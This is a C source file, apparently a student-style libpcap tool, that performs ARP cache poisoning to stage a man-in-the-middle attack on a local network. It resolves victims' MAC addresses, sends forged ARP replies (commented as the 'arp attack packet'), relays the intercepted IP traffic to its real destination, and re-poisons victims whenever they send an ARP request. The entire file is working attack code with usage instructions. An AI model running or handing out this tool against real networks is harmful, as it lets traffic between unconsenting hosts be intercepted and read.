#include <pcap.h>
#include <stdio.h>
#include <netinet/in.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h> /* for strncpy */

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>

#define ETHERTYPE_IP 0x0800
#define ETHERTYPE_ARP 0x0806

#define IPTYPE_ICMP 0x01
#define IPTYPE_TCP 0x06
#define IPTYPE_UDP 0x11

#define MAX_SESSION_COUNT 100

typedef struct my_ether_header 
{
	u_char ether_dmac[6];
	u_char ether_smac[6];
	u_short ether_type;
}my_eth;

typedef my_eth*  my_peth;

typedef struct my_ip_header
{
	u_char ip_hl:4, ip_v:4;	//header length
	u_char ip_tos;	//type of service
	u_short ip_len;	//total length
	u_short ip_id;	//identification
	u_short ip_ip_off;	//fragment offset field
	u_char ip_ttl;		//time to live
	u_char ip_p;		//protocol -> next tcp protocol
	u_short ip_sum;	//checksum
	struct in_addr ip_src, ip_dst; //source ip; destination ip
}my_ip;

typedef my_ip* my_pip;

#define ARP_REQUEST 1
#define ARP_REPLY 2


typedef struct my_arp_header
{
	u_int16_t ar_hrd;
	u_int16_t ar_pro;         /* format of protocol address */
	u_int8_t  ar_hln;         /* length of hardware address */
	u_int8_t  ar_pln;         /* length of protocol addres */
	u_int16_t ar_op;          /* operation type */
	uint8_t arp_sha[6];
	uint8_t arp_spa[4];
	uint8_t arp_tha[6];
	uint8_t arp_tpa[4];
}my_arp;

typedef my_arp* my_parp;

typedef struct my_tcp_header
{
	u_short tcp_sport;
	u_short tcp_dport;
	uint32_t tcp_seq;
	uint32_t tcp_ack;
	u_char tcp_x2:4, tcp_off:4;

	u_char tcp_flags;

	u_short tcp_win;
	u_short tcp_sum;
	u_short tcp_urp;
}my_tcp;

typedef my_tcp* my_ptcp;

typedef struct my_host_info
{
	uint32_t host_ip;
	uint8_t host_mac[6];
}host_info;

typedef struct tagarp
{
	uint32_t sender_IP;
	uint8_t sender_MAC[6];
	uint32_t target_IP;
	uint8_t target_MAC[6];
}arp_session;

//Data print function
void Print_Ether_Info(my_peth ehdr_pointer);
void Print_extra_data(u_char *str, int len);
void get_host_info(char* dev, host_info* my_host);
int get_mac_info(pcap_t* handle, host_info my_host, uint32_t target_IP, uint8_t* result);
int Create_ARP_Session(pcap_t *handle, host_info my_host, uint32_t sender_IP, uint32_t target_IP);

int main(int argc, char *argv[])
{
	struct pcap_pkthdr *header;	
	const u_char *packet;		
	int pcap_ret = 0;
	unsigned short my_arp_op = 0;
	uint32_t tmp;
	
	arp_session session[100];

	my_peth ehdr_pointer = NULL;
	my_parp arphdr_pointer = NULL;
	my_pip iphdr_pointer = NULL;


	int i = 50;
	int j = 1;

	short eth_type = 0;
	int session_count = 0;

	unsigned char my_packet_buf[60] = {0, };
	unsigned char relay_packet_buf[1000] = {0, };
	
	pcap_t *handle;		/* Session handle */
				/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[] = "";	/* The filter expression */
	
	bpf_u_int32 net = 0;		/* Our IP */

	
	host_info my_host;

	

	if(argc < 4 || argc & 1)
	{
		printf("usage  : %s <device_name> <sender IP> <target IP> <sender IP> <gateway IP> ...\n", argv[0]);
		return 2;
	}
	/* Open the session in promiscuous mode */
	handle = pcap_open_live(argv[1], BUFSIZ, 1, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't open device %s: %s\n", argv[1], errbuf);
		return(2);
	}
	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1) {
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}

	session_count = (argc - 2) / 2;
	
	if(session_count > MAX_SESSION_COUNT)
	{
		printf("Over MAX session count\n");
		return 3;
	}


	printf("Get Host info\n");
	get_host_info(argv[1], &my_host);

	for(i = 0; i < session_count; i++)
	{	
		printf("%d th session\n", i);
		//setting arp session info
		session[i].sender_IP = (uint32_t)inet_addr(argv[i*2 + 2]);
		get_mac_info(handle, my_host, session[i].sender_IP, session[i].sender_MAC);
		session[i].target_IP = (uint32_t)inet_addr(argv[i*2 + 3]);
		get_mac_info(handle, my_host, session[i].target_IP, session[i].target_MAC);
	}

	for(i=0;i<session_count;i++)
	{
		printf("sender_IP = %s\n", inet_ntoa(*(struct in_addr*)&session[i].sender_IP));
		for(j=0;j<6;j++)
		{
			printf("%02x", session[i].sender_MAC[j]);
			printf("%c",  j == 5 ? '\n': ':');
		}
		printf("\n");
		printf("target_IP = %s\n", inet_ntoa(*(struct in_addr*)&session[i].target_IP));
		for(j=0;j<6;j++)
		{
			printf("%02x", session[i].target_MAC[j]);
			printf("%c",  j == 5 ? '\n': ':');
		}
		printf("\n");
	}
	
	

	//make arp attack packet
	//

	for(i=0;i<session_count;i++)
	{	
		printf("%d th session\n", i);
		memset(my_packet_buf, 0x00, sizeof(my_packet_buf));
	
		ehdr_pointer = (my_peth)my_packet_buf;
		
		memcpy(ehdr_pointer->ether_dmac, session[i].sender_MAC, 6 * sizeof(uint8_t));
		memcpy(ehdr_pointer->ether_smac, my_host.host_mac, 6 * sizeof(uint8_t));
		ehdr_pointer->ether_type = htons(0x0806);
		
		arphdr_pointer = (my_parp)(my_packet_buf + sizeof(my_eth));
		
		arphdr_pointer->ar_hrd = htons(0x0001);
		arphdr_pointer->ar_pro = htons(0x0800);
		arphdr_pointer->ar_hln = 0x06;
		arphdr_pointer->ar_pln = 0x04;	
		arphdr_pointer->ar_op = htons(0x0002);
	
		memcpy(arphdr_pointer->arp_sha, my_host.host_mac, 6 * sizeof(uint8_t));
		memcpy(arphdr_pointer->arp_spa, &session[i].target_IP, 4 * sizeof(uint8_t));
		memcpy(arphdr_pointer->arp_tha, session[i].sender_MAC, 6 * sizeof(uint8_t));
		memcpy(arphdr_pointer->arp_tpa, &session[i].sender_IP, 4 * sizeof(uint8_t));

		pcap_sendpacket(handle, my_packet_buf, 60);
	}

	while(1)
	{
		memset(relay_packet_buf, 0x00, sizeof(relay_packet_buf));
		pcap_ret = pcap_next_ex(handle, &header, &packet);
		/* Print its length */
		if(pcap_ret == 1) /* Sucessfully read packet*/
		{			
			ehdr_pointer = (my_peth)packet;
			//Ethernet p
			eth_type = ntohs(ehdr_pointer->ether_type);			
			if(eth_type == ETHERTYPE_IP)	//relay session
			{
				iphdr_pointer = (my_pip)(packet + sizeof(my_eth));
				for(i=0;i<session_count;i++)
				{
					if(!memcmp(session[i].sender_MAC, ehdr_pointer->ether_smac, 6) && !memcmp(my_host.host_mac, ehdr_pointer->ether_dmac, 6) && (*(uint32_t*)&iphdr_pointer->ip_dst) == session[i].target_IP)
					{
						printf("Captured packet length : %d\n", header->caplen);
						memcpy(relay_packet_buf, packet, header->caplen);
						ehdr_pointer = (my_peth)relay_packet_buf;
						for(j=0;j<6;j++)
							ehdr_pointer->ether_smac[j] = my_host.host_mac[j];
						for(j=0;j<6;j++)
							ehdr_pointer->ether_dmac[j] = session[i].target_MAC[j];
						pcap_sendpacket(handle, relay_packet_buf, header->caplen);
					}
				}
						
			}
			else if(eth_type == ETHERTYPE_ARP)	//re-infaction session
			{
				arphdr_pointer = (my_parp)(packet + sizeof(my_eth));
				memcpy(&tmp, arphdr_pointer->arp_spa, 4 * sizeof(uint8_t));
				my_arp_op = ntohs(arphdr_pointer->ar_op);
				if( my_arp_op == ARP_REQUEST)
				{
					for(i=0;i<session_count;i++)
					{					
						if(tmp == session[i].sender_IP)
						{
								memset(my_packet_buf, 0x00, sizeof(my_packet_buf));

								ehdr_pointer = (my_peth)my_packet_buf;
	
								memcpy(ehdr_pointer->ether_dmac, session[i].sender_MAC, 6 * sizeof(uint8_t));
								memcpy(ehdr_pointer->ether_smac, my_host.host_mac, 6 * sizeof(uint8_t));
								ehdr_pointer->ether_type = htons(0x0806);		
								arphdr_pointer = (my_parp)(my_packet_buf + sizeof(my_eth));
	
								arphdr_pointer->ar_hrd = htons(0x0001);
								arphdr_pointer->ar_pro = htons(0x0800);
								arphdr_pointer->ar_hln = 0x06;
								arphdr_pointer->ar_pln = 0x04;	
								arphdr_pointer->ar_op = htons(0x0002);
	
								memcpy(arphdr_pointer->arp_sha, my_host.host_mac, 6 * sizeof(uint8_t));
								memcpy(arphdr_pointer->arp_spa, &session[i].target_IP, 4 * sizeof(uint8_t));
								memcpy(arphdr_pointer->arp_tha, session[i].sender_MAC, 6 * sizeof(uint8_t));
								memcpy(arphdr_pointer->arp_tpa, &session[i].sender_IP, 4 * sizeof(uint8_t));

								pcap_sendpacket(handle, my_packet_buf, 60);
								printf("re infected\n");
						
						}
						else
							continue;
					}
				}
	 		
		 	}
		}
		else if(pcap_ret == 0)
 		{
			printf("packet buffer timeout expired\n");
 			continue;
 		}
 		else if(pcap_ret == -1)
 		{
 			printf("error occured while reading the packet\n");
 			return -1;
 		}
 		else if(pcap_ret == -2)
 		{
 			printf("read from savefile and no more read savefile\n");
 			return -2;
 		}

	}

	return 0;

	
}


void Print_Ether_Info(my_peth ehdr_pointer)
{
	printf("dest mac =  %02x:%02x:%02x - %02x:%02x:%02x\n", ehdr_pointer->ether_dmac[0], ehdr_pointer->ether_dmac[1], ehdr_pointer->ether_dmac[2], ehdr_pointer->ether_dmac[3], ehdr_pointer->ether_dmac[4], ehdr_pointer->ether_dmac[5]);
	printf("src mac = %02x:%02x:%02x - %02x:%02x:%02x\n", ehdr_pointer->ether_smac[0], ehdr_pointer->ether_smac[1], ehdr_pointer->ether_smac[2], ehdr_pointer->ether_smac[3], ehdr_pointer->ether_smac[4], ehdr_pointer->ether_smac[5]);
	printf("next protocol type : %04x\n\n", ntohs(ehdr_pointer->ether_type));
}

void Print_extra_data(u_char *str, int len)
{
	int i = len;
	int roop = i / 16;
	int rem = i % 16;
	int cur = 0;

	while(cur < roop)
	{
		for(i=0;i<16;i++)
			printf("%02x ", str[cur * 16 + i]);

		printf("\n");

		cur++;
	}

	for(i=0;i<rem;i++)
		printf("%02x ", str[cur * 16 + i]);

	printf("\n");

}

void print_arp_info(my_parp arphdr_pointer)
{
	char ip_dst[20] = {0, };
	char ip_src[20] = {0, };

	uint16_t my_arp_op;
	int j;

     
	my_arp_op = ntohs(arphdr_pointer->ar_op);
	if(my_arp_op == ARP_REQUEST)
		printf("It is arp request packet\n");
	else if(my_arp_op == ARP_REPLY)
		printf("It is arp reply packet\n");

	inet_ntop(AF_INET, (struct in_addr*)arphdr_pointer->arp_spa, ip_dst, sizeof(ip_dst));
	inet_ntop(AF_INET, (struct in_addr*)arphdr_pointer->arp_tpa, ip_src, sizeof(ip_src));
	printf("Source IP : %s\n", ip_src);
	printf("Destination IP : %s\n", ip_dst);
	printf("Source Mac : ");
	for(j=0;j<6;j++)
	{
		printf("%02x", arphdr_pointer->arp_sha[j]);
		printf("%c",  j == 5 ? '\n': ':');
	}
	printf("Destination Mac : ");
	for(j=0;j<6;j++)
	{
		printf("%02x", arphdr_pointer->arp_tha[j]);
		printf("%c", j==5 ? '\n' : ':');
	}

}

void get_host_info(char* dev, host_info* my_host)
{
	int fd;
	struct ifreq ifr;
	struct ifconf ifc;
	char buf[1024];
	int success = 0;
	struct in_addr my_IP;
	
	int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	if (sock == -1) { /* handle error*/ };
	
	ifc.ifc_len = sizeof(buf);
	ifc.ifc_buf = buf;
	if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) { /* handle error */ }
	
	struct ifreq* it = ifc.ifc_req;
	const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));
	
	for (; it != end; ++it) {
		strcpy(ifr.ifr_name, it->ifr_name);
		if (ioctl(sock, SIOCGIFFLAGS, &ifr) == 0) {
			if (! (ifr.ifr_flags & IFF_LOOPBACK)) { // don't count loopback
				if (ioctl(sock, SIOCGIFHWADDR, &ifr) == 0) {
					success = 1;
					break;
				}
			}
		}
		else { /* handle error */ }
	}
	
	if (success) memcpy(my_host->host_mac, ifr.ifr_hwaddr.sa_data, 6);

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	/* I want to get an IPv4 IP address */
	ifr.ifr_addr.sa_family = AF_INET;
	
	/* I want IP address attached to "eth0" */
	strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
	
	ioctl(fd, SIOCGIFADDR, &ifr);
	
	close(fd);
	
	/* display result */

	my_IP = ((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr;

	my_host->host_ip = *(uint32_t*)&my_IP;
}

int get_mac_info(pcap_t *handle, host_info my_host, uint32_t target_IP, uint8_t* result)
{
	u_char my_packet_buf[60] = {0, };	
	const u_char *packet;

	struct pcap_pkthdr *header;
	uint16_t eth_type;
	uint16_t my_arp_op;


	my_peth ehdr_pointer = NULL;
	my_parp arphdr_pointer = NULL;
	
	int pcap_ret;
	uint32_t tmp;

	ehdr_pointer = (my_peth)my_packet_buf;

	memcpy(ehdr_pointer->ether_dmac, "\xff\xff\xff\xff\xff\xff", 6 * sizeof(uint8_t));
	memcpy(ehdr_pointer->ether_smac, my_host.host_mac, 6 * sizeof(uint8_t));
	ehdr_pointer->ether_type = htons(0x0806);

	arphdr_pointer = (my_parp)(my_packet_buf + sizeof(my_eth));

	arphdr_pointer->ar_hrd = htons(0x0001);
	arphdr_pointer->ar_pro = htons(0x0800);
	arphdr_pointer->ar_hln = 0x06;
	arphdr_pointer->ar_pln = 0x04;
	arphdr_pointer->ar_op = htons(0x0001);

	memcpy(arphdr_pointer->arp_sha, my_host.host_mac, 6 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_spa, &my_host.host_ip, 4 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_tha, "\x00\x00\x00\x00\x00\x00", 6 * sizeof(uint8_t));
	memcpy(arphdr_pointer->arp_tpa, &target_IP, 4 * sizeof(uint8_t));

	pcap_sendpacket(handle, my_packet_buf, 60);
	

	while(1)
	{
		pcap_ret = pcap_next_ex(handle, &header, &packet);
		/* Print its length */
		if(pcap_ret == 1) /* Sucessfully read packet*/
		{			
			ehdr_pointer = (my_peth)packet;
			//Ethernet p
			eth_type = ntohs(ehdr_pointer->ether_type);			
			if(eth_type == ETHERTYPE_ARP)
			{
				arphdr_pointer = (my_parp)(packet + sizeof(my_eth));
				memcpy(&tmp, arphdr_pointer->arp_spa, 4 * sizeof(uint8_t));
				my_arp_op = ntohs(arphdr_pointer->ar_op);
			
				if( my_arp_op == ARP_REPLY && target_IP == tmp )
				{
					printf("MAC address parsing complete!\n");
					memcpy(result, arphdr_pointer->arp_sha, 6 * sizeof(uint8_t));
					break;
				}
	 			/* And close the session */
		 	}
		}
		else if(pcap_ret == 0)
 		{
			printf("packet buffer timeout expired\n");
 			continue;
 		}
 		else if(pcap_ret == -1)
 		{
 			printf("error occured while reading the packet\n");
 			return -1;
 		}
 		else if(pcap_ret == -2)
 		{
 			printf("read from savefile and no more read savefile\n");
 			return -2;
 		}

	}
	
	return 0;

}


